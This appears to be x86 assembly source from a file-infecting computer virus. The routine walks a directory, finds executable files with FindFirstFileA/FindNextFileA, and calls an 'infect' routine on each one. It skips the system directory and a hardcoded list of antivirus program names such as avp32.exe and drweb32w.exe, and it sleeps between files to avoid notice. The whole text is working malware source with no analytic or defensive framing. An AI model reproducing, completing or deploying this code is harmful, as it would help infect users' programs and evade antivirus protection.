locals __
locals @@
__x	equ rec

infectdir:
	cld
	mov [firstinf], 0
	lea eax, [tempdir]
	push eax
	push 255
	push eax
	xcall GetSystemDirectoryA
	mov edi, eax
	lea esi, [tempdirl]
	push esi
	push esi
	push 255
	xcall GetCurrentDirectoryA
	mov esi, 4 ptr [esp]

IF DEBUG EQ 1
	call __76787
	db 13, 10, ">", 0
__76787:
	call _cout
	push esi
	call _cout
ENDIF

	mov 1 ptr [esi+edi], 0
	xcall lstrcmpiA
	or eax, eax
	jz infend

	; find first file 
	; mask
	cmp 1 ptr [ebp+act-__x], 0
	jz __exe
	; if activization, find all files
	push '*'
	push '****'
	jmp __00
__exe:

IF NORELEASE EQ 1
	push 'd'
	push 'zm.*'
ENDIF

IF RELEASE EQ 1
	push 'e'
	push 'xe.*'
ENDIF

__00:
	mov ecx, esp
	lea eax, [fdata]
	push eax
	push ecx
	xcall FindFirstFileA
	add esp, 8

	mov [hfind], eax

	; if file is not found, change directory
	cmp eax,-1
	jz infend

	; checking file name. if av program, skipp
gofile:
	lea edi, [ebp+list-__x]
	sub edx, edx
lookup:
	lea esi, [fdata].fd_fname

compare:
	;inc edi
	push edx
	push esi
	push edi
	xcall lstrcmpiA
	pop edx
	or eax, eax
	jz findnextone 
	or ecx, -1
	sub eax, eax
	repnz scasb 
	add edx, 1
	cmp edx, tabsize
	jb lookup

	call infect

	; if there are infected files in current dir, go to next dir
	cmp [firstinf], 0
	jnz endfilesearch 

	push 100
	xcall Sleep ; slowing-down


	; next file
findnextone:

	lea eax, [fdata]
	push eax
	push dword ptr [hfind]
	xcall FindNextFileA

	; инфицируем
	or eax,eax
	jnz gofile

	; nothing found
endfilesearch:
	push [hfind]
	xcall FindClose
infend:
	ret ; end of directory infection

tabsize equ 10

; av list
list 	db "avpcc.exe",0
	 	db "avp32.exe",0
	 	db "avpexec.exe",0
	 	db "avpinst.exe",0
	 	db "drweb32w.exe",0
	 	db "spider.exe",0
	 	db "spidernt.exe",0
	 	db "avltmain.exe",0
	 	db "apvxdwin.exe",0
	 	db "pavproxy.exe",0,0
